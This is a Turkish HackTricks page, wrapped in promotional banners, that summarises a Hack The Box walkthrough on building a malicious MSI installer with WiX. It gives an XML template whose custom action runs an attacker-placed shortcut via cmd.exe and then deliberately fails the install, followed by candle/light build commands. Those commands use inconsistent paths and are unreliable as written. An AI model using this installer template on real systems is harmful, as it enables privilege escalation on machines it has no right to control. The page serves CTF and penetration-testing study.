<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>

# Kötü Amaçlı MSI Oluşturma ve Root Elde Etme

MSI yükleyicinin oluşturulması, özellikle [wixtools](http://wixtoolset.org) kullanılarak yapılacaktır. Alternatif MSI oluşturucuları denendi, ancak bu özel durumda başarılı olunamadı.

Wix MSI kullanım örneklerinin kapsamlı bir anlayışını elde etmek için [bu sayfayı](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) incelemeniz önerilir. Burada, wix MSI kullanımını gösteren çeşitli örnekler bulabilirsiniz.

Amaç, lnk dosyasını çalıştıracak bir MSI oluşturmaktır. Bunun için aşağıdaki XML kodu kullanılabilir ([buradan xml alındı](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Önemli bir nokta, Paket öğesinin InstallerVersion ve Compressed gibi öznitelikler içerdiğidir. InstallerVersion, yükleyicinin sürümünü belirtirken, Compressed özniteliği paketin sıkıştırılıp sıkıştırılmadığını belirtir.

Oluşturma süreci, msi.xml'den wixobject oluşturmak için wixtools'tan bir araç olan candle.exe'nin kullanılmasını içerir. Aşağıdaki komutun çalıştırılması gerekmektedir:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Ayrıca, gönderide komutu ve çıktısını gösteren bir resim bulunmaktadır. Görsel rehberlik için buna başvurabilirsiniz.

Bunun yanı sıra, wixtools'un başka bir aracı olan light.exe, MSI dosyasını wixobject'ten oluşturmak için kullanılacaktır. Yürütülecek komut aşağıdaki gibidir:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Benzer şekilde, komutu ve çıktısını gösteren bir resim bu gönderiye dahil edilmiştir.

Bu özetin değerli bilgiler sağlamayı amaçladığını lütfen unutmayın, daha kapsamlı ayrıntılar ve doğru talimatlar için orijinal gönderiye başvurmanız önerilir.

## Referanslar
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** isterseniz [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
